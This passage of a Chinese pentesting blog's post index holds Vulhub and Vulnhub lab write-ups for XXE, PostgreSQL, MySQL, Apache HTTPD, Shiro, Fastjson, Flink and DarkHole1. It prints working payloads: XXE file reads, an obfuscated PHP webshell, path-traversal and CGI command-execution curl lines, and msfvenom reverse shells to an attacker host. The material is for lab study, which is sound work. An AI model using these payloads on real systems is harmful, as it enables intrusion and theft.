available!\n//解码后，找到关键信息：\n&lt;?php\n......\nif ($_POST['username'] == 'administhebest' &amp;&amp; \n md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609') &#123;\n $_SESSION['valid'] = true;\n $_SESSION['timeout'] = time();\n $_SESSION['username'] = 'administhebest';\n                 \n echo \"You have entered valid use name and password &lt;br />\";\n$flag = \"Here is the &lt;a style='color:FF0000;' href='/flagmeout.php'>Flag&lt;/a>\";\necho $flag;\n   &#125;else &#123;\n   $msg = 'Maybe Later';\n   &#125;\n &#125;\n?>\n......得到用户名administhebest及md5加密后的密码e6e061838856bf47e1de730719fb2609，密码解密后得到admin@123。得到疑似flag路径/flagmeout.php，直接通过浏览器访问/xxe/flagmeout.php，并查看源代码得到：&lt;!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) -->flag是一组大写字母+数字组合的密文，猜测是base32加密。\n\n字母全是大写 ——base32  \n字母是大小写组合 ——base64  \n\n解密后得到L2V0Yy8uZmxhZy5waHA=，继续进行base64解密，得到/etc/.flag.php。Ummm。。。the flag in /etc/.flag.php！！！，继续XXE：//HTTP Request\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n&lt;!DOCTYPE r [\n\n&lt;!ELEMENT r ANY>\n\n&lt;!ENTITY admin SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/.flag.php\">\n\n]>\n&lt;root>&lt;name>&amp;admin;&lt;/name>&lt;password>admin&lt;/password>&lt;/root>\n//HTTP Response （Origin）\nJF9bXSsrOyRfW109JF8uXzskX19fX189JF9bKCsrJF9fW10pXVsoKyskX19bXSkrKCsrJF9fW10pKygrKyRfX1tdKV07JF89JF9bJF9bK19dXTskX19fPSRfXz0kX1srKyRfX1tdXTskX19fXz0kXz0kX1srX107JF8rKzskXysrOyRfKys7JF89JF9fX18uKyskX19fLiRfX18uKyskXy4kX18uKyskX19fOyRfXz0kXzskXz0kX19fX187JF8rKzskXysrOyRfKys7JF8rKzskXysrOyRfKys7JF8rKzskXysrOyRfKys7JF8rKzskX19fPStfOyRfX18uPSRfXzskX19fPSsrJF9eJF9fX1srX107JMOAPStfOyTDgT0kw4I9JMODPSTDhD0kw4Y9JMOIPSTDiT0kw4o9JMOLPSsrJMOBW107JMOCKys7JMODKys7JMODKys7JMOEKys7JMOEKys7JMOEKys7JMOGKys7JMOGKys7JMOGKys7JMOGKys7JMOIKys7JMOIKys7JMOIKys7JMOIKys7JMOIKys7JMOJKys7JMOJKys7JMOJKys7JMOJKys7JMOJKys7JMOJKys7JMOKKys7JMOKKys7JMOKKys7JMOKKys7JMOKKys7JMOKKys7JMOKKys7JMOLKys7JMOLKys7JMOLKys7JMOLKys7JMOLKys7JMOLKys7JMOLKys7JF9fKCckXz0iJy4kX19fLiTDgS4kw4IuJMODLiRfX18uJMOBLiTDgC4kw4EuJF9fXy4kw4EuJMOALiTDiC4kX19fLiTDgS4kw4AuJMODLiRfX18uJMOBLiTDgi4kw4MuJF9fXy4kw4EuJMOCLiTDgC4kX19fLiTDgS4kw4kuJMODLiRfX18uJMOBLiTDiS4kw4AuJF9fXy4kw4EuJMOJLiTDgC4kX19fLiTDgS4kw4QuJMOGLiRfX18uJMOBLiTDgy4kw4kuJF9fXy4kw4EuJMOGLiTDgS4kX19fLiTDgS4kw4guJMODLiRfX18uJMOBLiTDgy4kw4kuJF9fXy4kw4EuJMOILiTDgy4kX19fLiTDgS4kw4YuJMOJLiRfX18uJMOBLiTDgy4kw4kuJF9fXy4kw4EuJMOELiTDhi4kX19fLiTDgS4kw4QuJMOBLiRfX18uJMOBLiTDiC4kw4MuJF9fXy4kw4EuJMOJLiTDgS4kX19fLiTDgS4kw4kuJMOGLiciJyk7JF9fKCRfKTsK\n//HTTP Response （Decoded）\n$_[]++;$_[]=$_._;$_____=$_[(++$__[])][(++$__[])+(++$__[])+(++$__[])];$_=$_[$_[+_]];$___=$__=$_[++$__[]];$____=$_=$_[+_];$_++;$_++;$_++;$_=$____.++$___.$___.++$_.$__.++$___;$__=$_;$_=$_____;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=+_;$___.=$__;$___=++$_^$___[+_];$Ã=+_;$Ã=$Ã=$Ã=$Ã=$Ã=$Ã=$Ã=$Ã=$Ã=++$Ã[];$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$__('$_=\"'.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.'\"');$__($_);对响应体进行base64解密后还是密文，经查询，该密文为一段没有标识符的PHP webshell，加上标识符&lt;?php?&gt;，并编译运行得到flag xxe_is_so_easy：注意此处要使用PHP 5.X的版本，否则无法获取flag。Parse error: syntax error, unexpected '&#123;' in D:\\phpstudy_pro\\WWW\\test.php(2) : assert code on line 1\n\nCatchable fatal error: assert() [function.assert]: Failure evaluating code: SAFCSP&#123;xxe_is_so_easy&#125; in D:\\phpstudy_pro\\WWW\\test.php on line 2到这里/flagmeout.php算是利用完了，现在用得到的账号密码admin:admin@123登录/xxe/看看。登录不上去？？犯傻了。。登陆的应该是/xxe/admin.php，成功登陆。查看有Flag的跳转链接，就是上面拿到的/flagmeou.php。\n\n","categories":["渗透测试"],"tags":["Vulnhub","XXE"]},{"title":"Vulhub|PostgreSQL集合","url":"/44cd77ef.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.PostgreSQL 提权漏洞（CVE-2018-1058）影响版本 : PostgreSQL 9.3-10Path : postgres/CVE-2018-1058Vul : 提权PostgreSQL  \n\n\n相关语法可查看SQL  \n\n当用户创建数据库后，默认操作设置都是在名为public的schema下进行的。任何用户可以在public下创建对象(新建表、新建函数等操作)。PostSQL的search_path默认值：&quot;$user&quot;,public ：$user声明搜索和当前用户同名的schema（缺省）。因为还没有这样的模式存在，所以这条记录被忽略。public指向public schema。postgres=> SHOW search_path;\n  search_path   \n-----------------\n\"$user\", public\n(1 行记录)除了public和用户创建的schema之外，每个数据库都包含一个pg_catalog schema，它包含系统表和所有内置数据类型、函数、操作符。pg_catalog总是search_path中的一部分。如果它没有明确出现在search_path中，那么它隐含地在所有search_path之前搜索。这样就保证了内置名字总是可以被搜索。  \n\n\nBreakthrough：在public schema上重载函数，加入恶意的程序代码。等待其他账户，尤其是高权限账户调用这个函数的时候，就会执行恶意代码（以高权限执行）从而达到远程恶意代码执行的目的。查看当前postgres数据库用户，vulhub不具有super权限：postgres=# SELECT rolname,rolsuper FROM pg_roles;\n     rolname      | rolsuper \n-------------------+----------\npg_signal_backend | f\npostgres          | t\nvulhub            | f\n(3 rows)\n以低权限用户vulhub创建表T_vulhub，此时表默认创建在public里。postgres=> create table T_vulhub as select 'vulhub'::varchar as contents;\nSELECT 1\npostgres=> \\d\n              关联列表\n架构模式 |   名称   |  类型  | 拥有者 \n----------+----------+--------+--------\npublic   | t_vulhub | 数据表 | vulhub\n(1 行记录)以低权限用户vulhub创建函数upper，此时函数默认创建在public里。postgres=> create function upper(varchar) returns text as $$\npostgres$> alter role vulhub superuser; //将vulhub的权限提升至superuser\npostgres$> select pg_catalog.upper($1);\npostgres$> $$ language sql volatile;\nCREATE FUNCTION若此时用非super权限的vulhub去执行，则展示执行失败。postgres=> select upper(contents) from T_vulhub;\nERROR:  must be superuser to alter superusers\n背景:  SQL function \"upper\" statement 1当具有super权限的用户执行上述函数upper时，便会触发其中的恶意提权代码，低权限用户vulhub成功提至superuser权限。postgres=# select upper(contents) from T_vulhub;\nupper  \n--------\nVULHUB\n(1 row)\npostgres=# select rolname,rolsuper from pg_roles;\n     rolname      | rolsuper \n-------------------+----------\npg_signal_backend | f\npostgres          | t\nvulhub            | t\n(3 rows)Q：为什么此处优先执行的是public中的upper()，而不是pg_catalog中的upper()呢？postgres=> \\df upper;\n                          函数列表\n 架构模式  | 名称  | 结果数据类型 |   参数数据类型    | 类型 \n------------+-------+--------------+-------------------+------\npg_catalog | upper | anyelement   | anyrange          | 函数\npg_catalog | upper | text         | text              | 函数\npublic     | upper | text         | character varying | 函数\n(3 行记录)pg_catalog.upper()的入参类型是text，public.upper()的入参类型是varchar，执行该函数时传入的参数是T_vulhub.contents，是varchar类型的，为‘最佳匹配’。  \n\n2.PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）影响版本 : PostgreSQL 9.3-11.2Path : postgres/CVE-2019-9193Vul : 任意命令执行Breakthrough：  \n\n从9.3版本开始，Postgres新增了一个 COPY TO/FROM PROGRAM 功能，允许数据库的 超级用户 以及 pg_read_server_files组 中的任何用户执行操作系统命令。在数据库建一张用于回显系统命令执行结果的表 –&gt; 利用copy函数将系统命令执行结果复制到表中：postgres=# create table test(contents text);\nCREATE TABLE\npostgres=# \\dt test\n             关联列表\n架构模式 | 名称 |  类型  |  拥有者  \n----------+------+--------+----------\npublic   | test | 数据表 | postgres\n(1 行记录)\npostgres=# copy test from program 'id';\nCOPY 1\npostgres=# select * from test;\n                               contents                                \n------------------------------------------------------------------------\nuid=999(postgres) gid=999(postgres) groups=999(postgres),103(ssl-cert)\n(1 行记录)\npostgres=# copy test from program 'cat /etc/passwd';\nCOPY 21\npostgres=# select * from test;\n                                    contents                                      \n-----------------------------------------------------------------------------------\nuid=999(postgres) gid=999(postgres) groups=999(postgres),103(ssl-cert)\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\npostgres:x:999:999::/var/lib/postgresql:/bin/bash\nDebian-exim:x:101:101::/var/spool/exim4:/bin/false\n(22 行记录)\n\n","categories":["渗透测试"],"tags":["Vulhub","PostgreSQL"]},{"title":"SQL|命令集合","url":"/ffeb3adb.html","content":"PostgreSQL(:5432)登录PostgreSQL\npsql --host &lt;ip> --username &lt;name>;\n\n查询数据库列表\n\\list 或 \\l 或 \\list+ 或 \\l+ –+：扩展vulhub=> \\l+\n                                                                     数据库列表\n  名称   |  拥有者  | 字元编码 |  校对规则  |   Ctype    |        存取权限        |  大小   |   表空间    |                    描述                    \n----------+---------+----------+-----------+------------+-----------------------+---------+------------+-------------------------------------------\npostgres | postgres | UTF8   | en_US.utf8 | en_US.utf8 |                       | 7063 kB | pg_default | default administrative connection database\ntemplate0| postgres | UTF8   | en_US.utf8 | en_US.utf8 | =c/postgres          +| 6953 kB | pg_default | unmodifiable empty database\n         |          |        |            |            | postgres=CTc/postgres |         |            | \ntemplate1| postgres | UTF8   | en_US.utf8 | en_US.utf8 | =c/postgres          +| 6953 kB | pg_default | default template for new databases\n         |          |        |            |            | postgres=CTc/postgres |         |            | \nvulhub   | vulhub   | UTF8   | en_US.utf8 | en_US.utf8 | =Tc/vulhub           +| 7103 kB | pg_default | \n         |          |        |            |            | vulhub=CTc/vulhub     |         |            | \n\n使用数据库\nvulhub=> \\c postgres\npsql (14.1 (Debian 14.1-4), 服务器 9.6.7)\n您现在已经连接到数据库 \"postgres\",用户 \"vulhub\".\n\n查询当前用户\n\\c 或 \\conninfo –只适用于psql命令select * from current_user; 或 select userpostgres=> \\conninfo  \n以用户 \"vulhub\" 的身份, 在主机\"192.168.228.3\", 端口\"5432\"连接到数据库 \"postgres\"\npostgres=> select * from current_user;\ncurrent_user \n--------------\nvulhub\n(1 行记录)\n\n查询当前数据库所有表\npostgres=# select * from pg_tables;\n    schemaname  |      tablename     | tableowner | tablespace | hasindexes | hasrules | hastriggers | rowsecurity \n--------------------+-------------------------+------------+------------+------------+----------+-------------+-----\npublic          | t_vulhub           | vulhub     |            | f          | f        | f           | f\npg_catalog      | pg_statistic       | postgres   |            | t          | f        | f           | f\n\n查询表结构\npostgres=> \\dt T_vulhub;\n              关联列表\n架构模式 |   名称   |  类型  | 拥有者 \n----------+----------+--------+--------\npublic   | t_vulhub | 数据表 | vulhub\n(1 行记录)\n\n查询函数信息\npostgres=> \\df upper;\n                          函数列表\n 架构模式  | 名称  | 结果数据类型 |   参数数据类型    | 类型 \n------------+-------+--------------+-------------------+------\npg_catalog | upper | anyelement   | anyrange          | 函数\npg_catalog | upper | text         | text              | 函数\npublic     | upper | text         | character varying | 函数\n(3 行记录)\n\n符号\n&#39;xxx&#39;::&lt;type&gt; ： 将xxx转化为指定type常量。&lt;xxx&gt;as&lt;yyy&gt; ： 以yyy的结果定义xxx。$ ： 引用常量。$$ ： 包裹函数主体。volatile ： volatile指函数可以修改数据库, 函数参数值相同的情况下, 可以返回不同的结果, 所以volatile函数在执行过程中优化器对它的处理是每一行都需要执行一次volatile函数。\n\nOracleDB(:1521)报错\nQ1.远程连接数据库提示未监听：\nORA-12541:TNS:no listener\nA1.未启动数据库监听：\n[oracle@localhost ~]$ lsnrctl status //查询\n[oracle@localhost ~]$ lsnrctl start //启动\nQ2.远程连接数据库提示不知名服务\nORA-12514: TNS:listener does not currently know of service requested in connect descriptor\nA2.监听启动了但数据库未启动\n[oracle@localhost ~]$ sqlplus / as sysdba\nSQL> startup\nORACLE instance started.\nQ3.登录提示连接到空闲实例：\nSQL> conn / as sysdba\nConnected to an idle instance.\nA3.未启动数据库：\nSQL> startup\nORACLE instance started. //启动\n\n登录OracleDB\n[oracle@localhost ~]$ sqlplus / as sysdba;\n**=**\n[oracle@localhost ~]$ sqlplus /nolog  //连接数据库暂不登录\nSQL> conn / as sysdba;\n\n查询某角色具有的权限（以DBA为例）\nselect * from role_tab_privs where role = 'DBA'; --查询角色DBA具有的对象权限（对象权限赋予角色）\nselect * from role_sys_privs where role = 'DBA'; --查询角色DBA具有的系统权限（系统权限赋予角色）\nselect * from role_role_privs where role = 'DBA'; --查询角色DBA具有的角色（角色赋予角色）\n\n查询用户账户具有的权限（以SYS为例）\nselect * from DBA_tab_privs where GRANTEE = 'SYS';\nselect * from DBA_role_privs where GRANTEE = 'DBA';\nselect * from DBA_sys_privs where GRANTEE = 'DBA';\n\nROLE_TAB_PRIVSROLE_TAB_PRIVS describes table privileges granted to roles. Information is provided only about roles to which the user has access.\n","categories":["SQL"],"tags":["SQL"]},{"title":"Vulhub|MySQL集合","url":"/7b78999f.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Mysql 身份认证绕过漏洞（CVE-2012-2122）影响版本 :     MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.    MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.Vul : 身份认证绕过Path :mysql/CVE-2012-2122Breakthrough：  \n\n当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。for i in `seq 1 1000`; do mysql -uroot -pwrong -h &lt;sql服务器ip> -P&lt;port> ; done\n\nfor i in seq 1 1000; do mysql -uroot -pwrong -h 10.101.20.212 -P3306 ; done\n","categories":["渗透测试"],"tags":["Vulhub","MySQL"]},{"title":"Vulhub|CGI集合","url":"/9f24c7bd.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.HTTPoxy漏洞（CVE-2016-5385）Path : cgi/httproxyVul : HTTProxyBreakthrough：  \n\n根据RFC 3875规定，CGI（fastcgi）要将用户传入的所有HTTP头都加上HTTP_前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的HTTP_PROXY值作为HTTP代理地址。于是，恶意用户通过提交Proxy: http://evil.com这样的HTTP头，将使用缺陷类库的网站的代理设置为http://evil.com，进而窃取数据包中可能存在的敏感信息。正常请求，origin 参数为当前发起请求的服务器。构造请求，在请求头中加入 Proxy: http://&lt;ip&gt;:&lt;port&gt;，并在 &lt;ip&gt; 所在主机使用 nc -l -p &lt;port&gt; 监听代理端口，发送请求，监听到请求报文。  \n\n","categories":["渗透测试"],"tags":["Vulhub","CGI","HTTProxy"]},{"title":"Vulhub|HTTPD集合","url":"/2ba89e8d.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Apache HTTPD 换行解析漏洞（CVE-2017-15715）影响版本 : Apache HTTPD 2.4.0 - 2.4.29Path : httpd/CVE-2017-15715Vul : 文件上传Breakthrough：  \n\n&lt;FilesMatch \".+\\.ph(p[3457]?|t|tml)$\">\n\n正则表达式定位符$：匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \\n 或 \\r 之前的位置匹配。  \n\n故此处可通过文件名后缀 &lt;file_name&gt;.php%0a，进行对.php文件上传限制的绕过并成功当作.php文件解析。访问 http://:/&lt;file_name&gt;.php%0a 能够成功访问解析了文件中php程序的页面（必须带上%0a，否则文件不存在）。  \n\nQ：为什么 .php%0d 或 .php%0a%0d 或 %.php%0d%0a 能够绕过上传，但无法成功解析php？A：“可能是因为解析代码中对%0d进行了处理”    \n与Nginx Insecure-configuration中的CRLF注入漏洞（HRS）相似。  \n\n\n2.Apache HTTP Server 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）影响版本 : Apache HTTPD ≤ 2.4.48Path : httpd/CVE-2021-40438Vul : SSRFBreakthrough：  \n\nSSRF攻击的目标是从公网无法直接访问的内网后端服务器。（正是因为它是由反代服务器发起的，所以它能够请求到与反代服务器相连而与公网隔离的内网后端服务器）SSRF 形成的原因大都是由于服务端提供了从其他后端服务器应用获取数据的功能且没有对目标地址做过滤与限制。Apache在配置反代的后端服务器时，有两种情况：  \n\n直接使用某个协议反代到某个IP和端口，比如 ProxyPass / “http://localhost:8080&quot; \n使用某个协议反代到unix套接字，比如 ProxyPass / “unix:/var/run/www.sock|http://localhost:8080/&quot;  \n\n目的是访问后端服务器，故不能让反代服务器把请求发送到unix套接字上，而是发送给我们需要的 | 后面的地址。为了使前段套接字返回null，需使其 （长度+4） ＞ （APR_PATH_MAX=4096），可构造请求：GET /?unix:&#123;A*4096&#125;|http://dnslog.cn/ HTTP/1.1\nHost: 192.168.1.162:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\n\n3.Apache HTTP Server 目录穿越漏洞（CVE-2021-41773、CVE-2021-42013）影响版本 : Apache HTTPD 2.4.49 - 2.4.50Path : httpd/CVE-2021-41773、CVE-2021-42013Vul : 目录穿越Breakthrough：  \n\n// /icons/必须是一个存在且可访问的目录\ncurl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n// 服务端开启了cgi或cgid这两个mod\ncurl -v --data \"echo;id\" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'\n// Apache HTTPD 2.4.50\ncurl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd\ncurl -v --data \"echo;id\" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'\n\n4.Apache HTTPD 多后缀解析漏洞Path : httpd/apache_parsing_vulnerabilityVul : 文件上传Breakthrough：  \n\nApache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。若管理人员给.php后缀增加了处理器：AddHandler application/x-httpd-php .php那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。将写有php程序的文件后缀改为.php.jpg 或 .php.jpeg 即可绕过上传。  \n\n5.Apache SSI 远程命令执行漏洞Path : httpd/ssi-rceVul : 文件上传Breakthrough：  \n\n目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用 &lt;!--#exec cmd=&quot;id&quot; --&gt; 语法执行任意命令。上传成功后，访问上传的文件，返回命令执行结果。  \n\n","categories":["渗透测试"],"tags":["Vulhub","Httpd","文件上传","SSRF","目录穿越"]},{"title":"Linux|命令集合","url":"/88fdf392.html","content":"系统命令\nsu ： 仅切换身份。su - ： 身份与$PATH工作路径都切换。su 和 su- 最大的本质区别就是：前者只是切换了root身份，但Shell环境仍然是普通用户的Shell；而后者连用户和Shell环境一起切换成root身份了。（可通过pwd 和 $PATH 查看区别）\n\nDocker\n// 查看 docker 守护进程运行状态  \nservice docker status  \n\n// 启动/关闭/重启 docker 守护进程\nservice docker start/stop/restart  \n\n// 返回所有容器和镜像的数量、docker使用的执行程序和存储驱动，以及docker的基本配置信息  \ndocker info  \n\n// 显示正在运行的容器  \ndocker ps  \ndocker container ls  \n\n// 显示已安装的容器\ndocker ps -a\n\n// 查看某容器所有状态信息(ip...)\ndocker inspect [docker_name 或 docker_id]\n\n// 在已经启动的容器内部运行进程  \ndocker exec -it [docker_name 或 docker_id] /bin/bash //创建tty终端，捕捉STDIN，在容器内启动一个交互式命令  \ndocker exec -d docker_name/docker_id touch /home/test.txt //-d表示后台进程，在指定容器中运行一个后台进程'touch /home/test.txt'\n\nJava\n// 切换java版本  \nupdate-alternatives --config java\n\n// 设置java版本优先级  \nupdate-alternatives --install /usr/bin/java java /usr/local/java/jdk1.8.0_311/bin/java 1110    \n\n","categories":["Linux"],"tags":["Linux"]},{"title":"Vulhub|Fastjson集合","url":"/32c50423.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Fastjson 反序列化导致任意命令执行漏洞影响版本 : Fastjson xPath : fastjson/1.2.24-rce 、 1.2.47-rceVul : 反序列化Breakthrough：  \n\n通过DNSLog对各版本Fastjson反序列化漏洞进行验证的payload：x &lt; 1.2.67\n&#123;\"zeo\":&#123;\"@type\":\"java.net.Inet4Address\",\"val\":\"3xho90.dnslog.cn\"&#125;&#125;\nx >= 1.2.67\n&#123;\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog.cn\"&#125;\n&#123;\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog.cn\"&#125;\n\n","categories":["渗透测试"],"tags":["Vulhub","Fastjson","反序列化"]},{"title":"Vulhub|Shiro集合","url":"/7d27907c.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）影响版本 : Shiro &lt; 1.2.4Path : shiro/CVE-2016-4437Vul : 反序列化漏洞Breakthrough：  \n\n响应头中含有 “rememberMe=deleteMe” ：Shiro反序列化漏洞的标志。使用漏洞检测工具 ShiroExploit + nc监听 反弹shell至攻击机。  \n\n2.Apache Shiro Authentication Bypass Vulnerability (CVE-2020-1957)影响版本 : Shiro &lt; 1.5.1Path : shiro/CVE-2020-1957Vul : 认证绕过Breakthrough：  \n\n@Bean\npublic ShiroFilterChainDefinition shiroFilterChainDefinition() &#123;  \n   DefaultShiroFilterChainDefinition chainDefinition = new DefaultShiroFilterChainDefinition();  \n   chainDefinition.addPathDefinition(\"/login.html\", \"authc\"); // need to accept POSTs from the login form  \n   chainDefinition.addPathDefinition(\"/logout\", \"logout\");  \n   chainDefinition.addPathDefinition(\"/admin/**\", \"authc\");  \n   return chainDefinition;  \n&#125;  \n\n\n直接访问管理页面 /admin/ ，重定向到登陆界面 login.html。构造 /xxx/..;/admin/ ，绕过权限校验，访问到管理页面。URL请求过程：  \n\n客户端请求URL: /xxx/..;/admin/  \nShrio 内部处理得到校验URL为 /xxx/..,校验通过  \nSpringBoot 处理 /xxx/..;/admin/ , 最终请求 /admin/, 成功访问了后台请求  \n\n\n","categories":["渗透测试"],"tags":["Vulhub","Shiro"]},{"title":"Vulhub|Flink集合","url":"/338e3c98.html","content":"0.靶场搭建参考作者[jpSpaceX]写的文章https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Apache Flink Upload Path Traversal (CVE-2020-17518)影响版本 : Flink 1.5.1-1.11.2Path : flink/CVE-2020-17518Vul : 文件上传Breakthrough：  \n\n（a）msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=444 -f jar -o shell.jar – 上传生成的.jar文件 – 上传成功（b）msf开启监听 – 前端Submit上传的.jar包 – msf这里使用shell命令getshell  \n\n2.Apache Flink jobmanager/logs Path Traversal (CVE-2020-17519)影响版本 : Flink 1.11.0-1.11.2Path : flink/CVE-2020-17519Vul : 目录穿越Breakthrough：  \n\n已经给出了存在目录穿越的目录jobmanager/logs – 访问http://&lt;aim_ip&gt;:&lt;aim_port&gt;/jobmanager/logs – bp拦截 – 修改GET参数为 /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd  – 能够返回/etc/passwd文件内容  \n\n","categories":["渗透测试"],"tags":["Vulhub","Flink"]},{"title":"Vulnhub|DarkHole1","url":"/480ec251.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\nnmap扫描nmap -sn 192.168.xxx.0/24发现目标主机ip。nmap -sS -Pn -A -p- -n 192.168.228.129 扫一下详细信息，发现启用了22和80端口。  \n\n2.(80端口)Web\n访问http://192.168.228.129发现是一个登陆页面，靶机介绍页提示了不要把时间浪费在爆破上，故这里注册一个账号登陆进去看看是什么，以username=admin注册时，提示用户名已存在：使用注册的账号登陆成功，GET请求传递参数id=2，这里猜测id=1就是用户admin，直接把url中的id=2改为id=1验证是否存在越权，前端提示：”Your Not Allowed To Access another user information”。有一个修改密码的入口，修改密码使用bp拦截一下，修改POST的传参id=1，修改成功：使用[账户：密码][admin：123456]登录，登陆成功，成功获取admin权限。  \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\nadmin权限包含一个上传文件的功能，直接上传一句话木马 .php文件，前端页面提示”Sorry , Allow Ex : jpg,png,gif “，这里尝试了4种办法都没有成功getshell。  \n\n（a）bp拦截-将Content-Type: application/x-php改为Content-Type: imge/jpg-重放；（b）bp拦截-Hex模式下对传入文件名进行00截断（在.php与.jpg之间插入Hex Code）-重放\n\n(在php&lt;5.3.4中，处理字符串的函数认为0x00是终止符。%00在url语言里代表空格“ ”，因此它起到的作用就是截断文件的后半段，让它识别到的文件格式是.jpg，而解析时会是前面的脚本格式。)；\n\n（c）在木马文件 .php头部加上jpg格式的GIF89进行欺骗-上传成功-但上传的文件仍是以 .jpg为后缀，无法执行其中的php代码，此处也找不到可以FileInclusion的地方。（d）copy /b a.jpg+shell.php shell.jpg将木马写入图片末端-上传成功-但上传的文件仍是以 .jpg为后缀，无法执行其中的php代码，此处也找不到可以FileInclusion的地方。  \n\n以如下方式结尾的文件会被apache当做php解析：php、php3、php4、php5、php7、pht、phtml看了网上其他人的思路，发现自己刻板局限地认为上传文件的白名单只有前端提示的jpg、png和gif。其实只要将木马文件后缀改为phtml也能够上传成功并成功解析php代码。这里使用msfvenom生成反弹shell代码文件msfshell.php：msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.228.128 lport=443 -o msfshell.php文件生成后把代码&lt;?php前多余的部分删掉，把文件后缀改为 .phtml，成功上传文件。查看上传成功的响应报文能获得服务器的文件上传路径 /upload/&lt;木马文件&gt;使用msfconsole进行监听：use exploit&#x2F;multi&#x2F;handler  \nset payload php&#x2F;meterpreter&#x2F;reverse_tcp  \nset lhost 192.168.228.128 &#x2F;&#x2F;同msfvenom生成反弹shell代码中设置的lhost  \nset lport 443 